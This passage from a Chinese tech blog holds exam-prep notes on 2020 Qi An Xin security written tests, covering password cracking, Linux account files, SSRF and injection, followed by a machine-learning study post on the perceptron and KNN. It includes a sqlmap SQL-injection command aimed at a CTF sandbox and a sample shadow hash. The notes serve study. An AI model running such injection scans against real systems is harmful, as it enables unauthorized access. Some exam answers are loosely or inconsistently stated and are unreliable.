class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#空格作为分隔字符串的标志</span></span><br><span class="line">commands = <span class="built_in">input</span>().strip().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">stack, redo = [], []</span><br><span class="line"><span class="keyword">for</span> cmd <span class="keyword">in</span> commands:</span><br><span class="line">    <span class="keyword">if</span> cmd == <span class="string">&quot;undo&quot;</span>:</span><br><span class="line">        <span class="comment">#如果stack不为空</span></span><br><span class="line">        <span class="keyword">if</span> stack:</span><br><span class="line">            redo.append(stack.pop())</span><br><span class="line">    <span class="keyword">elif</span> cmd == <span class="string">&quot;redo&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> redo:</span><br><span class="line">            stack.append(redo.pop())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        redo.clear()</span><br><span class="line">        stack.append(cmd)</span><br><span class="line"><span class="comment">#用空格连接stack中的字符串</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot; &quot;</span>.join(stack))</span><br></pre></td></tr></table></figure><h1 id="【2020】奇安信秋招安全方向试卷2"><a href="#【2020】奇安信秋招安全方向试卷2" class="headerlink" title="【2020】奇安信秋招安全方向试卷2"></a>【2020】奇安信秋招安全方向试卷2</h1><p>1.其中不是密码破解的方式为？( B )</p><p>A. 密码学分析；B. 撞库；C. 暴力破解；D.字典破解</p><p>解析：</p><ul><li>密码分析学的主要目的是研究加密消息的破译和消息的伪造。通过分析密文来推断该密文对应的明文或者所用密码的密钥的过程也称作密码攻击。密码学分析可分为四类：唯密文攻击、已知明文攻击、选择明文攻击、选择密文攻击。</li><li>撞库是黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表，尝试批量登录其他网站后，得到一系列可以登录的用户。撞库不属于密码破解。</li><li>暴力破解一般指枚举法。暴力破解就是利用所有可能的字符组密码，去尝试破解。这是最原始、粗暴的破解方法，根据运算能力，如果能够承受得起时间成本的话，最终一定会爆破出密码。</li><li>字典破解就是通过比较合理的条件，筛选或者过滤掉一些全字符组合的内容，大幅降低爆破的成本。我们把筛选出的密码组合成特定的字典。现在用字典爆破密码也是可以的，但是这样做有可能会漏掉真正的密码。</li></ul><p>2.缓冲区溢出漏洞是指当计算机向缓冲区内填充数据位数时，超过了缓冲区本身的容量，溢出的数据覆盖在合法数据上。</p><p>3.网络信息系统安全的第一道防线：系统自身没有漏洞；第二道防线：防病毒和Web应用防护系统(Web Application Firewall, WAF)，入侵防御系统(Intrusion Prevention System, IPS)，入侵检测系统(Intrusion Detection System, IDS)；第三道：数据库备份。</p><p>4.在/etc/passwd文件中有一行为：test:x:0:1000::/home/test:/bin/sh，这代表test用户为特权用户。</p><p>解析：/etc/passwd文件中记录了每个用户的一些基本属性。系统管理员经常会接触到这个文件的修改以完成对用户的管理工作。</p><p>/etc/passwd中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段，其格式和具体含义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell</span><br></pre></td></tr></table></figure><ul><li>用户名：代表用户账号的字符串。通常长度不超过8个字符，并且由大小写字母和/或数字组成。登录名中不能有冒号(:)，因为冒号在这里是分隔符。为了兼容起见，登录名中最好不要包含点字符(.)，并且不使用连字符(-)和加号(+)开头。</li><li>口令：一些系统中，存放着加密后的用户口令字。虽然这个字段存放的只是用户口令的加密串，不是明文，但是由于/etc/passwd文件对所有用户都可读，所以这仍是一个安全隐患。因此，现在许多Linux系统（如SVR4）都使用了shadow技术，把真正的加密后的用户口令字存放到/etc/shadow文件中，而在/etc/passwd文件的口令字段中只存放一个特殊的字符，例如“x”或者“*”。</li><li>用户标识号：是一个整数，系统内部用它来标识用户。一般情况下它与用户名是一一对应的。如果几个用户名对应的用户标识号是一样的，系统内部将把他们视为同一个用户，但是他们可以有不同的口令、不同的主目录以及不同的登录Shell等。通常用户标识号的取值范围是0～65535。0是超级用户root的标识号，1～99由系统保留，作为管理账号，普通用户的标识号从100开始。在Linux系统中，这个上限是500。</li><li>组标识号：字段记录的是用户所属的用户组。它对应着/etc/group文件中的一条记录。</li><li>注释性描述：字段记录着用户的一些个人情况，例如用户的真实姓名、电话、地址等，这个字段并没有什么实际的用途。在不同的Linux系统中，这个字段的格式并没有统一。在许多Linux系统中，这个字段存放的是一段任意的注释性描述文字，用作finger命令的输出。</li><li>主目录：也就是用户的起始工作目录，它是用户在登录到系统之后所处的目录。在大多数系统中，各用户的主目录都被组织在同一个特定的目录下，而用户主目录的名称就是该用户的登录名。各用户对自己的主目录有读、写、执行（搜索）权限，其他用户对此目录的访问权限则根据具体情况设置。</li><li>登录Shell：用户登录后，要启动一个进程，负责将用户的操作传给内核，这个进程是用户登录到系统后运行的命令解释器或某个特定的程序，即Shell。Shell是用户与Linux系统之间的接口。系统管理员可以根据系统情况和用户习惯为用户指定某个Shell。如果不指定Shell，那么系统使用sh为默认的登录Shell，即这个字段的值为/bin/sh。用户的登录Shell也可以指定为某个特定的程序（此程序不是一个命令解释器）。利用这一特点，我们可以限制用户只能运行指定的应用程序，在该应用程序运行结束后，用户就自动退出了系统。有些Linux系统要求只有那些在系统中登记了的程序才能出现在这个字段中。系统中有一类用户称为伪用户（psuedousers），这些用户在Linux /etc/passwd文件中也占有一条记录，但是不能登录，因为它们的登录Shell为空。它们的存在主要是方便系统管理，满足相应的系统进程对文件属主的要求。</li></ul><p>5.对于Windows系统，提权就是从User用户提升到system用户。</p><p>6.使用静态的ARP缓存可以有效地对抗ARP欺骗。</p><p>7.日常所见的校园饭卡是利用的身份认证的单因素法。<a href="http://blog.chinaunix.net/uid-20509115-id-1660146.html">身份认证的方法</a></p><p>8.如果在/etc/shadow文件中存在一行为：<br>test:!!$6​$tGvVUhEY$PIkpI43HPaEoRrNJSRpM3H0YWOsqTqXCxtER6rak5PMaAoyQohrXNB0YoFCmAuh406n8XOvBBldvMy9trmIV00:18047:7:90:7:::<br>这代表test用户账号不可以正常使用。</p><p>解析：/etc/shadow 文件，用于存储 Linux 系统中用户的密码信息，又称为“影子文件”。/etc/shadow 文件只有 root 用户拥有读权限，其他用户没有任何权限，这样就保证了用户密码的安全性。</p><p>同 /etc/passwd 文件一样，文件中每行代表一个用户，同样使用 “:” 作为分隔符，不同之处在于，每行用户信息被划分为 9 个字段。每个字段的含义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名:加密密码:最后一次修改时间:最小修改时间间隔:密码有效期:密码需要变更前的警告天数:密码过期后的宽限时间:账号失效时间:保留字段</span><br></pre></td></tr></table></figure><ul><li><p>用户名：同 /etc/passwd 文件的用户名有相同的含义。</p></li><li><p>加密密码：这里保存的是真正加密的密码。目前 Linux 的密码采用的是 SHA512 散列加密算法。注意，这串密码产生的乱码不能手工修改，如果手工修改，系统将无法识别密码，导致密码失效。很多软件通过这个功能，在密码串前加上 “!”、”*“ 或 “x” 使密码暂时失效。所有伪用户的密码都是 “!!” 或 “*“，代表没有密码是不能登录的。当然，新创建的用户如果不设定密码，那么它的密码项也是 “!!”，代表这个用户没有密码，不能登录。</p></li><li><p>最后一次修改时间：此 root 账号在 1970 年 1 月 1 日之后的第 18047 天修改的 root 用户密码。那么，到底 18047 代表的是哪一天呢？可以使用如下命令进行换算：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(v5le0n9㉿kali)-[~]</span><br><span class="line">└─$ date -d &quot;1970-01-01 18047 days&quot;</span><br><span class="line">2019年 05月 31日 星期五 00:00:00 CST</span><br></pre></td></tr></table></figure></li><li><p>最小修改时间间隔：最小修改间隔时间，也就是说，该字段规定了从第 3 字段（最后一次修改密码的日期）起，多长时间之内不能修改密码。如果是 0，则密码可以随时修改；如果是 10，则代表密码修改后 10 天之内不能再次修改密码。此字段是为了针对某些人频繁更改账户密码而设计的。</p></li><li><p>密码有效期：经常变更密码是个好习惯，为了强制要求用户变更密码，这个字段可以指定距离第 3 字段（最后一次更改密码）多长时间内需要再次变更密码，否则该账户密码进行过期阶段。该字段的默认值为 99999，也就是 273 年，可认为是永久生效。如果改为 90，则表示密码被修改 90 天之后必须再次修改，否则该用户即将过期。管理服务器时，通过这个字段强制用户定期修改密码。</p></li><li><p>密码需要变更前的警告天数：与第 5 字段相比较，当账户密码有效期快到时，系统会发出警告信息给此账户，提醒用户 “再过 n 天你的密码就要过期了，请尽快重新设置你的密码！”。该字段的默认值是 7，也就是说，距离密码有效期的第 7 天开始，每次登录系统都会向该账户发出 “修改密码” 的警告信息。</p></li><li><p>密码过期后的宽限时间：也称为“口令失效日”，简单理解就是，在密码过期后，用户如果还是没有修改密码，则在此字段规定的宽限天数内，用户还是可以登录系统的；如果过了宽限天数，系统将不再让此账户登录，也不会提示账户过期，是完全禁用。比如说，此字段规定的宽限天数是 10，则代表密码过期 10 天后失效；如果是 0，则代表密码过期后立即失效；如果是 -1，则代表密码永远不会失效。</p></li><li><p>账号失效时间：同第 3 个字段一样，使用自  1970 年 1 月 1 日以来的总天数作为账户的失效时间。该字段表示，账号在此字段规定的时间之外，不论你的密码是否过期，都将无法使用！该字段通常被使用在具有收费服务的系统中。</p></li><li><p>保留字段：这个字段目前没有使用，等待新功能的加入。</p></li></ul><p>9.如果sa是空口令，那就意味着攻击者可能侵入系统执行任意操作，威胁系统安全。</p><p>解析：MSSQL SERVER 的默认管理员帐号是 SA，所以一般把 MSSQL SERVER 的空密码叫作SA空口令。</p><p>10.<code>set charcter_set_client=&#39;gbk&#39;</code>可能造成宽字符注入。</p><p>11.安全审计是系统活动和记录的独立检查和验证，其功能有：①辅助辨识和分析未经授权的活动或攻击；②对与已建立的安全策略的一致性进行核查；③帮助发现需要改进的安全控制措施。</p><p>12.非军事化区DMZ是为了解决安全防火墙后外部网络不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。</p><p>解析：DMZ（Demilitarized Zone）即俗称的隔离区或非军事区，与军事区和信任区相对应，作用是把WEB，e-mail等允许外部访问的服务器单独接在该区端口，使整个需要保护的内部网络接在信任区端口后，不允许任何访问，实现内外网分离，达到用户需求。DMZ可以理解为一个不同于外网或内网的特殊网络区域，DMZ内通常放置一些不含机密信息的公用服务器，比如Web、Mail、FTP等。这样来自外网的访问者可以访问DMZ中的服务，但不可能接触到存放在内网中的公司机密或私人信息等，即使DMZ中服务器受到破坏，也不会对内网中的机密信息造成影响。</p><p>13.PostgreSQL的默认端口为5432。</p><p>14.Windows系统漏洞微软的漏洞编号命名格式为：MS08067<br>MS Micosoft的缩写，固定格式；<br>08 表示年份，即2008年发布的漏洞；<br>067 表示顺序，即当年度发布的第67个漏洞。</p><p>15.RSA可用于加密，数字签名和密钥交换体制。</p><p>16.DNS欺骗是发生在TCP/IP协议中应用层的问题。</p><p>17.NTP服务一般开启的端口是UDP123。</p><p>解析：NTP(Network Time Protocol)是用来使计算机时间同步化的一种协议，它可以使计算机对其服务器或时钟源(如石英钟，GPS等等)做同步化，它可以提供高精准度的时间校正(LAN上与标准间差小于1毫秒，WAN上几十毫秒)，且可介由加密确认的方式来防止恶毒的协议攻击。</p><p>18.SSRF（Server-Side Request Forgery）服务端请求伪造，SSRF是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。 一般情况下，SSRF攻击的目标是从外网无法访问的内部系统（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。SSRF漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。</p><p>19.启动数据库的账号一般是高权限账号，使用数据库执行系统命令即相当于使用高权限账号执行系统命令，因此数据库提权也属于权限继承类提权。</p><p>20.蠕虫病毒是一种常见的计算机病毒，是无须计算机使用者干预即可运行的独立程序，它通过不停的获得网络中存在漏洞的计算机上的部分或全部控制权来进行传播。计算机病毒是指编制或者在计算机程序中插入的破坏计算机功能或者破坏数据和恶意篡改系统，影响计算机使用并且能够自我复制的一组计算机指令或者程序代码。</p><p>蠕虫是一种可以自我复制的代码，并且通过网络传播，通常无需人为干预就能传播。蠕虫病毒入侵并完全控制一台计算机之后，就会把这台机器作为宿主，进而扫描并感染其他计算机。当这些新的、被蠕虫入侵的计算机被控制之后，蠕虫会以这些计算机为宿主继续扫描并感染其他计算机，这种行为会一直延续下去。蠕虫使用这种递归的方法进行传播，按照指数增长的规律分布自己，进而及时控制越来越多的计算机。</p><p>21.安全套接字协议(Secure Sockets Layer，SSL)，及其继任者传输层安全(Transport Layer Security，TLS)是为网络通信提供安全及数据完整性的一种安全协议。TLS与SSL在传输层与应用层之间对网络连接进行加密。</p><p>22.<code>PermitRootLogin no</code>意思是不允许root账号直接登录系统。</p><p>23.linux中tail -f 可以读取正在发生改变的日志文件。</p><p>解析：tail用于查看文件尾部的内容，与head相对应。常用来查看日志文件，通过-f实时查看文件最新内容。尤其是对于日志文件较大的时候，通过tail指定输出的行数来查看日志。</p><p>24.sqlmap中-u可以进行POST型注入的检测。</p><p>解析：-u可以进行POST型注入，但不是用-u检测，而是用—data检测。-u后接URL。比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://challenge-9a6148b6244df91d.sandbox.ctfhub.com:10800 --batch --data=&quot;id=1&amp;pwd=333&quot;</span><br></pre></td></tr></table></figure><p>25.Cobalt Strike的默认端口号是50050。</p><p>解析：Cobalt Strike简称CS，是一款GUI框架式的渗透测试工具，集成了很多功能。最大的特点是可以团战，有一个服务器多个客户端，每个客户端就是一个攻击者，攻击者通过连接到服务端来共享攻击资源和目标信息甚至session，服务器必须是Linux系统的。</p><p>26.路由权值的计算可能基于路径某单一特性计算，也可能基于路径多种属性。动态路由协议是按照路由的路由权值来判断路由的好坏，并且每一种路由协议的判断方法都是不一样的。</p><p>27.IGP（内部网关协议）是在一个自治网络内网关（主机和路由器）间交换路由信息的协议。路由信息能用于网间协议（IP）或者其它网络协议来说明路由传送是如何进行的。IGP协议包括路由信息协议(RIP，Routing Information Protocol)、开放最短路径优先(Open Shortest Path First，OSPF)、中间系统到中间系统(Intermediate System-to-Intermediate System，IS-IS)、内部网关路由协议(Interior Gateway Routing Protocol，IGRP)、增强内部网关路由协议(Enhanced Interior Gateway Routing Protocol，EIGRP)。</p><p>28.路由环问题会引起慢收敛、广播风暴、路由不一致的问题。</p><p>29.点对点协议（Point to Point Protocol，PPP）为在点对点连接上传输多协议数据包提供了一个标准方法。PPP 最初设计是为两个对等节点之间的 IP 流量传输提供一种封装协议。在 TCP-IP 协议集中它是一种用来同步调制连接的数据链路层协议。</p><p>30.网络防火墙的作用有：①防止内部信息外泄；②防止黑客访问；③建立内部信息和功能与外部信息和功能之间的屏障。</p><p>31.Xposed框架的原理及常用的函数。</p><p>答：原理： 替换system/bin/app_process文件，app_process就是zygote进程文件，所以Xposed通过替换zygote进程实现了控制手机上所有app进程。</p><p>常用函数：</p><p> (1)findAndHookMethod 参数：实现该方法的类的名称，用于解析目标和参数类的类加载器，目标方法名称，目标方法的参数以及回调；</p><p> (2)findAndHookConstructor hook构造函数 参数：实现该方法的类的名称，用于解析目标和参数类的类加载器，目标方法的参数以及回调；</p><p>(3)findClass：使用指定的类加载器查找类 类名的语法 java.lang.String java.lang.String[] android.app.ActivityThread.ResourcesKey android.app.ActivityThread$ResourcesKey 参数：上面格式的类名，类加载器 </p><p>(4)findField：在类中查找自动并将其设置为可访问 参数：变量所在的class，变量名String </p><p>(5)CallMethod 调用给定对象的实例或静态方法 参数：对象实例，方法名称，方法调用的参数 </p><p>(6)newInstance 创建给定类的新实例 参数：类引用，构造函数调用的参数</p><p>32.简述Hook技术。</p><p>答：Hook 技术又叫做钩子函数，在系统没有调用该函数之前，钩子程序就先捕获该消息，钩子函数先得到控制权，这时钩子函数既可以加工处理(改变)该函数的执行行为，还可以强制结束消息的传递。简单来说，就是把系统的程序拉出来变成我们自己执行代码片段。   </p><p>要实现钩子函数，有两个步骤：   </p><ol><li>利用系统内部提供的接口，通过实现该接口，然后注入进系统（特定场景下使用）   </li><li>动态代理（使用所有场景）</li></ol><h1 id="【2020】奇安信秋招安全方向试卷3"><a href="#【2020】奇安信秋招安全方向试卷3" class="headerlink" title="【2020】奇安信秋招安全方向试卷3"></a>【2020】奇安信秋招安全方向试卷3</h1><p>1.下列类型中，不是java语言基本数据类型的是( C )</p><p>A. long；B. double；C. String；D. float</p><p>解析：String不是Java语言基本数据类型，它是引用类型。</p><p>2.CPU的调度分为高级，中级和低级三种，其中高级调度是作业调度；中级调度是交换调度；低级调度是进程调度。</p><p>3.uaf漏洞分析中需要开启的选项为？</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;笔试主要内容：网络协议、操作系统、攻击原理&lt;/p&gt;
&lt;p&gt;认真对待每次笔试和面试，积累经验，小凉一定不会失业的！一定可以找到适合自己的工作的！&lt;/p&gt;</summary>
    
    
    
    <category term="往社畜方向前进" scheme="http://example.com/categories/%E5%BE%80%E7%A4%BE%E7%95%9C%E6%96%B9%E5%90%91%E5%89%8D%E8%BF%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>机器学习</title>
    <link href="http://example.com/posts/498ab7d9.html"/>
    <id>http://example.com/posts/498ab7d9.html</id>
    <published>2022-04-29T02:53:43.610Z</published>
    <updated>2022-06-23T01:47:06.694Z</updated>
    
    <content type="html"><![CDATA[<p>做机器学习的实验做得我生无可恋，还是先补一下机器学习的几个算法的基本原理再说吧。</p><span id="more"></span><h1 id="1-统计学习概述"><a href="#1-统计学习概述" class="headerlink" title="1. 统计学习概述"></a>1. 统计学习概述</h1><h2 id="1-1-统计学习三要素"><a href="#1-1-统计学习三要素" class="headerlink" title="1.1. 统计学习三要素"></a>1.1. 统计学习三要素</h2><ul><li><p>模型：确定学习模型的集合。模型在未进行训练前，其可能的参数是多个甚至无穷的，故可能的模型也是多个甚至无穷的，这些模型构成的集合就是假设空间。</p><img src="/posts/498ab7d9/1.1.1.png" class="" title="假设空间"><img src="/posts/498ab7d9/1.1.2.png" class="" title="假设空间"></li><li><p>策略：确定模型选择的准则。即从假设空间中挑选出参数最优的模型的准则。模型的分类或预测结果与实际情况的误差（损失函数）越小，模型就越好。那么策略就是误差最小。</p><img src="/posts/498ab7d9/1.1.3.png" class="" title="策略"><img src="/posts/498ab7d9/1.1.4.png" class="" title="损失函数"><img src="/posts/498ab7d9/1.1.5.png" class="" title="策略"></li><li><p>算法：实现求解最优模型的算法。即从假设空间中挑选模型的方法（等同于求解最佳的模型参数）。机器学习的参数求解通常都会转化为最优化问题，故学习算法通常是最优化算法，例如最速梯度下降法、牛顿法以及拟牛顿法等。</p></li></ul><p>以上是针对监督学习的三要素，下面是针对无监督学习的三要素：</p><img src="/posts/498ab7d9/1.1.6.png" class="" title="无监督学习的三要素"><h2 id="1-2-监督学习"><a href="#1-2-监督学习" class="headerlink" title="1.2. 监督学习"></a>1.2. 监督学习</h2><p>监督学习：从标注数据中学习预测模型的机器学习问题，其本质是学习输入到输出的映射的统计规律。</p><p>输入空间：输入的所有可能取值的集合。</p><p>实例：每一个具体的输入，通常由特征向量表示。</p><p>特征空间：所有特征向量存在的空间。</p><p>输出空间：输出的所有可能取值的集合。</p><p>根据变量类型的不同，可分为回归问题、分类问题和标注问题。</p><p>回归问题：输入变量与输出变量均为连续变量的预测问题。</p><p>分类问题：输出变量为有限个离散变量的预测问题。</p><p>标注问题：输入变量与输出变量均为变量序列的预测问题。</p><img src="/posts/498ab7d9/1.3.1.png" class="" title="监督学习中的符号表示"><img src="/posts/498ab7d9/1.3.2.png" class="" title="监督学习中的符号表示"><h2 id="1-3-无监督学习"><a href="#1-3-无监督学习" class="headerlink" title="1.3. 无监督学习"></a>1.3. 无监督学习</h2><p>无监督学习：从无标注数据中学习预测模型的机器学习问题，其本质是学习数据中的统计规律或潜在结构。</p><img src="/posts/498ab7d9/1.4.1.png" class="" title="无监督学习中的符号表示"><h2 id="1-4-模型评估与选择"><a href="#1-4-模型评估与选择" class="headerlink" title="1.4 模型评估与选择"></a>1.4 模型评估与选择</h2><p>训练误差：</p><img src="/posts/498ab7d9/1.5.1.png" class="" title="训练误差"><p>测试误差：</p><img src="/posts/498ab7d9/1.5.2.png" class="" title="测试误差"><p>误差率与准确率：</p><img src="/posts/498ab7d9/1.5.3.png" class="" title="误差率与准确率"><p>多项式拟合案例：</p><img src="/posts/498ab7d9/1.5.4.png" class="" title="案例"><img src="/posts/498ab7d9/1.5.5.png" class="" title="案例"><img src="/posts/498ab7d9/1.5.6.png" class="" title="案例"><p>过拟合：学习时选择的模型所包含的参数过多，以至于出现这一模型对已知数据预测得很好，但对未知数据预测得很差的现象。</p><img src="/posts/498ab7d9/1.5.7.png" class="" title="训练误差与测试误差"><img src="/posts/498ab7d9/1.5.8.png" class="" title="训练误差与测试误差"><p>欠拟合：模型拟合程度不高，数据距离拟合曲线较远，或指模型没有很好地捕捉到数据特征，不能够很好地拟合数据。</p><p>为了避免过拟合的问题出现，需要选择合适的模型。常用的模型选择方法：正则化和交叉验证。</p><h2 id="1-5-正则化和交叉验证"><a href="#1-5-正则化和交叉验证" class="headerlink" title="1.5 正则化和交叉验证"></a>1.5 正则化和交叉验证</h2><h3 id="1-5-1-正则化"><a href="#1-5-1-正则化" class="headerlink" title="1.5.1 正则化"></a>1.5.1 正则化</h3><p>正则化：实现结构风险最小化策略。</p><img src="/posts/498ab7d9/1.5.9.png" class="" title="正则化"><img src="/posts/498ab7d9/1.5.10.png" class="" title="正则化项"><p>奥卡姆剃刀原理：在模型选择时，选择所有可能模型中，能很好解释已知数据并且十分简单的模型。</p><h3 id="1-5-2-交叉验证"><a href="#1-5-2-交叉验证" class="headerlink" title="1.5.2 交叉验证"></a>1.5.2 交叉验证</h3><img src="/posts/498ab7d9/1.5.11.png" class="" title="数据充足的情况下"><p>在数据不足的情况下：</p><ul><li>简单交叉验证：随即将数据分为两部分，即训练集和测试集。</li><li>S折交叉认证：随机将数据分为S个互不相交、大小相同的子集，其中以S-1个子集作为训练集，余下的子集作为测试集。</li><li>留一交叉验证：S折交叉验证的特殊情形，S=N，N为数据集的样本容量。(在数据极少的情况下使用)</li></ul><h2 id="1-6-泛化能力"><a href="#1-6-泛化能力" class="headerlink" title="1.6 泛化能力"></a>1.6 泛化能力</h2><img src="/posts/498ab7d9/1.6.1.png" class="" title="泛化误差"><img src="/posts/498ab7d9/1.6.2.png" class="" title="泛化误差上界"><img src="/posts/498ab7d9/1.6.3.png" class="" title="泛化误差上界"><h2 id="1-7-生成模型与判别模型"><a href="#1-7-生成模型与判别模型" class="headerlink" title="1.7 生成模型与判别模型"></a>1.7 生成模型与判别模型</h2><h3 id="1-7-1-生成模型"><a href="#1-7-1-生成模型" class="headerlink" title="1.7.1 生成模型"></a>1.7.1 生成模型</h3><img src="/posts/498ab7d9/1.7.1.png" class="" title="生成模型"><h3 id="1-7-2-判别模型"><a href="#1-7-2-判别模型" class="headerlink" title="1.7.2 判别模型"></a>1.7.2 判别模型</h3><img src="/posts/498ab7d9/1.7.2.png" class="" title="判别模型"><h3 id="1-7-3-两者区别"><a href="#1-7-3-两者区别" class="headerlink" title="1.7.3 两者区别"></a>1.7.3 两者区别</h3><img src="/posts/498ab7d9/1.7.3.png" class="" title="生成模型VS判别模型"><h2 id="1-8-监督学习应用"><a href="#1-8-监督学习应用" class="headerlink" title="1.8 监督学习应用"></a>1.8 监督学习应用</h2><h3 id="1-8-1-分类问题"><a href="#1-8-1-分类问题" class="headerlink" title="1.8.1 分类问题"></a>1.8.1 分类问题</h3><img src="/posts/498ab7d9/1.8.1.png" class="" title="二分类问题"><img src="/posts/498ab7d9/1.8.2.png" class="" title="二分类问题"><p>方法：感知机、K近邻法、朴素贝叶斯、决策树、Logistic回归。</p><p>应用：银行业务、网络安全、图像处理、手写识别、互联网搜索。</p><h3 id="1-8-2-标注问题"><a href="#1-8-2-标注问题" class="headerlink" title="1.8.2 标注问题"></a>1.8.2 标注问题</h3><img src="/posts/498ab7d9/1.8.3.png" class="" title="标注问题"><p>方法：隐马尔可夫模型、条件随机场。</p><p>应用：信息抽取、自然语言处理。</p><h3 id="1-8-3-回归问题"><a href="#1-8-3-回归问题" class="headerlink" title="1.8.3 回归问题"></a>1.8.3 回归问题</h3><p>类型：</p><ul><li>按输入变量个数：一元回归、多元回归</li><li>按输入和输出变量之间的关系：线性回归、非线性回归</li></ul><p>损失函数：平方损失</p><p>应用：商务领域</p><h1 id="2-感知机"><a href="#2-感知机" class="headerlink" title="2. 感知机"></a>2. 感知机</h1><h2 id="2-1-感知机模型"><a href="#2-1-感知机模型" class="headerlink" title="2.1 感知机模型"></a>2.1 感知机模型</h2><img src="/posts/498ab7d9/2.1.1.png" class="" title="模型介绍"><img src="/posts/498ab7d9/2.1.2.png" class="" title="模型介绍"><p>在几何中，如果特征空间是n维的，则超平面是n-1维的子空间。比如特征空间是2维的，那么超平面就是一条直线，超平面用来分隔正类和负类。</p><img src="/posts/498ab7d9/2.1.3.png" class="" title="感知机模型的条件"><img src="/posts/498ab7d9/2.1.4.png" class="" title="感知机学习策略"><img src="/posts/498ab7d9/2.1.5.png" class="" title="感知机学习策略"><h2 id="2-2-梯度下降法"><a href="#2-2-梯度下降法" class="headerlink" title="2.2 梯度下降法"></a>2.2 梯度下降法</h2><img src="/posts/498ab7d9/2.2.1.png" class="" title="梯度的概念"><img src="/posts/498ab7d9/2.2.2.png" class="" title="梯度下降法的算法"><p>例子：</p><img src="/posts/498ab7d9/2.2.3.png" class="" title="梯度下降法的例子"><img src="/posts/498ab7d9/2.2.4.png" class="" title="梯度下降法的例子"><p>梯度下降法的原理：</p><img src="/posts/498ab7d9/2.2.5.png" class="" title="梯度下降法的原理"><img src="/posts/498ab7d9/2.2.6.png" class="" title="梯度下降法的原理"><img src="/posts/498ab7d9/2.2.7.png" class="" title="梯度下降法的原理"><h2 id="2-3-感知机的原始形式"><a href="#2-3-感知机的原始形式" class="headerlink" title="2.3 感知机的原始形式"></a>2.3 感知机的原始形式</h2><p>感知机采用监督学习中的二分类问题。原始形式用随机梯度下降法来更新w和b。</p><img src="/posts/498ab7d9/2.3.1.png" class="" title="感知机学习问题"><img src="/posts/498ab7d9/2.3.2.png" class="" title="随机梯度下降法"><p>原始形式的算法：</p><img src="/posts/498ab7d9/2.3.3.png" class="" title="原始形式的算法"><p>例题分析：</p><img src="/posts/498ab7d9/2.3.4.png" class="" title="例题分析"><img src="/posts/498ab7d9/2.3.5.png" class="" title="例题分析"><img src="/posts/498ab7d9/2.3.6.png" class="" title="例题分析"><img src="/posts/498ab7d9/2.3.7.png" class="" title="例题分析"><img src="/posts/498ab7d9/2.3.8.png" class="" title="例题分析"><img src="/posts/498ab7d9/2.3.9.png" class="" title="例题分析"><h2 id="2-4-感知机的对偶形式"><a href="#2-4-感知机的对偶形式" class="headerlink" title="2.4 感知机的对偶形式"></a>2.4 感知机的对偶形式</h2><img src="/posts/498ab7d9/2.4.1.png" class="" title="原始形式"><img src="/posts/498ab7d9/2.4.2.png" class="" title="原始形式"><p>对偶形式的算法：</p><img src="/posts/498ab7d9/2.4.3.png" class="" title="对偶形式的算法"><img src="/posts/498ab7d9/2.4.4.png" class="" title="对偶形式的算法"><p>例题分析：</p><img src="/posts/498ab7d9/2.4.5.png" class="" title="例题分析"><img src="/posts/498ab7d9/2.4.6.png" class="" title="例题分析"><img src="/posts/498ab7d9/2.4.7.png" class="" title="例题分析"><img src="/posts/498ab7d9/2.4.8.png" class="" title="例题分析"><img src="/posts/498ab7d9/2.4.9.png" class="" title="例题分析"><h2 id="2-5-算法的收敛性"><a href="#2-5-算法的收敛性" class="headerlink" title="2.5 算法的收敛性"></a>2.5 算法的收敛性</h2><img src="/posts/498ab7d9/2.5.1.png" class="" title="定理"><img src="/posts/498ab7d9/2.5.2.png" class="" title="定理的证明"><img src="/posts/498ab7d9/2.5.3.png" class="" title="定理的证明"><img src="/posts/498ab7d9/2.5.4.png" class="" title="定理的证明"><img src="/posts/498ab7d9/2.5.5.png" class="" title="定理的证明"><img src="/posts/498ab7d9/2.5.6.png" class="" title="定理的证明"><img src="/posts/498ab7d9/2.5.7.png" class="" title="算法的收敛性"><h1 id="3-K近邻"><a href="#3-K近邻" class="headerlink" title="3. K近邻"></a>3. K近邻</h1><h2 id="3-1-K近邻相关概念"><a href="#3-1-K近邻相关概念" class="headerlink" title="3.1 K近邻相关概念"></a>3.1 K近邻相关概念</h2><img src="/posts/498ab7d9/3.1.1.png" class="" title="K近邻概念"><img src="/posts/498ab7d9/3.1.2.png" class="" title="K近邻直观理解"><p>K近邻算法：</p><img src="/posts/498ab7d9/3.1.3.png" class="" title="K近邻算法"><p>误差率：</p><img src="/posts/498ab7d9/3.1.4.png" class="" title="误差率"><img src="/posts/498ab7d9/3.1.5.png" class="" title="误差率"><img src="/posts/498ab7d9/3.1.6.png" class="" title="误差率"><img src="/posts/498ab7d9/3.1.7.png" class="" title="误差率"><h2 id="3-2-K近邻三要素"><a href="#3-2-K近邻三要素" class="headerlink" title="3.2 K近邻三要素"></a>3.2 K近邻三要素</h2><h3 id="3-2-1-K近邻模型"><a href="#3-2-1-K近邻模型" class="headerlink" title="3.2.1 K近邻模型"></a>3.2.1 K近邻模型</h3><img src="/posts/498ab7d9/3.2.1.png" class="" title="K近邻模型"><h3 id="3-2-2-距离度量"><a 